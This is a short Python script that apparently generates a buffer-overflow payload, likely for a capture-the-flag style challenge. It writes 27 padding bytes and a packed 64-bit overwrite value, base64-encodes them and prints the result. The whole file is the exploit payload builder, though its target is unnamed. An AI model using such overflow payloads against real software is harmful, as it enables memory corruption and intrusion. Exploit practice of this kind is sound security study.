
import sys
import struct
import base64

buf = b'hhhhhhhhhhhhhhhhhhhhhhhhhhh'
buf += struct.pack('<Q', 4354596124521298789)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
